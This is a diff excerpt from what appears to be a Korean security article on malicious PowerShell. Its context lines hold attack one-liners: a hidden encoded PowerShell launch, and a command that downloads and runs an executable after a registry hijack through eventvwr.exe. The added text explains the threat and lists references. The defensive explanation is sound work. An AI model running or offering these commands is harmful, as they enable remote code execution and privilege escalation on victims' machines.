@@ -66,3 +66,14 @@ cmd.exe /c Start /Min PowerShell.exe -NoP -NonI -EP ByPass -W Hidden -E JE9TPShH
 
 cmd.exe /c powershell.exe -w hiddden -nop -ep bypass (New-Object System.Net.WebClient).DownloadFile('http://blog.plura.io/demo/sick.exe','%TEMP%\sick.exe') & reg add HKCU\SOFTWARE\Classes\mscfile\shell\open\command /d %tmp%\sick.exe /f & C:\Windows\system32\eventvwr.exe & PING -n 15 127.0.0.1>nul & %tmp%\sick.exe
 ```
+
+악성 PowerShell 스크립트는 주로 email 첨부 파일의 다운로더로 사용되거나 침입 후 원격 컴퓨터에서 코드를 실행할 수 있습니다.  
+PowerShell 위협에 대처하려면 보다 정교한 탐지 방법과 지속적인 모니터링 등의 노력이 필요합니다.
+
+## 참조
+- https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1511980157.pdf
+- https://docs.broadcom.com/doc/increased-use-of-powershell-in-attacks-16-en
+- https://www.ahnlab.com/kr/site/securityinfo/secunews/secuNewsView.do?seq=25651
+
+## 관련 기사, 보안뉴스
+- https://bit.ly/2V99SLF
